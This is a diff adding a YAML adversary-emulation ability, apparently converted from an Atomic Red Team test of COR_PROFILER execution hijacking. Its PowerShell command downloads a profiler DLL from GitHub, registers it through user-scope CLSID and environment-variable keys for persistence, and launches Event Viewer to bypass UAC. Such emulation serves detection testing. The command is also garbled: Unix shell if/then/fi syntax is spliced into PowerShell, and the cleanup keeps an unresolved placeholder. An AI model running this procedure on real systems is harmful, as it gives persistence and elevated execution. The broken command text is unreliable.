@@ -1,0 +1,83 @@
+- id: 9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a
+  name: User scope COR_PROFILER
+  description: 'Creates user scope environment variables and CLSID COM object to enable
+    a .NET profiler (COR_PROFILER).
+
+    The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded
+    by the Event Viewer process.
+
+    Additionally, the profiling DLL will inherit the integrity level of Event Viewer
+    bypassing UAC and executing `notepad.exe` with high integrity.
+
+    If the account used is not a local administrator the profiler DLL will still execute
+    each time the CLR is loaded by a process, however,
+
+    the notepad process will not execute with high integrity.
+
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/'
+  tactic: persistence
+  technique:
+    attack_id: T1574.012
+    name: 'Hijack Execution Flow: COR_PROFILER'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
+          -OutFile "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll"; fi; Write-Host
+          "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}"
+          -ForegroundColor Cyan; New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32"
+          -Value "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll" -Force | Out-Null;
+          New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType
+          String -Value "1" -Force | Out-Null; New-ItemProperty -Path HKCU:\Environment
+          -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+          -Force | Out-Null; New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH"
+          -PropertyType String -Value "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll"
+          -Force | Out-Null; Write-Host "executing eventvwr.msc" -ForegroundColor
+          Cyan; START MMC.EXE EVENTVWR.MSC'
+        cleanup: Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse
+          -Force -ErrorAction Ignore; Remove-ItemProperty -Path HKCU:\Environment
+          -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty
+          -Path HKCU:\Environment -Name "COR_PROFILER" -Force -ErrorAction Ignore
+          | Out-Null; Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH"
+          -Force -ErrorAction Ignore | Out-Null
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1574.012
+  - persistence
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file_name:
+        description: unmanaged profiler DLL
+        type: path
+        default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
+      clsid_guid:
+        description: custom clsid guid
+        type: string
+        default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
+    dependencies:
+    - description: '"#{file_name}" must be present
+
+        '
+      prereq_command: 'if (Test-Path "#{file_name}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{file_name}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
+        -OutFile "#{file_name}"
+
+        '
+    technique_created: '2020-06-24T22:30:55.843Z'
+    atomic_guid: 9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a
+    import_timestamp: '2025-06-24T11:15:05.436947Z'
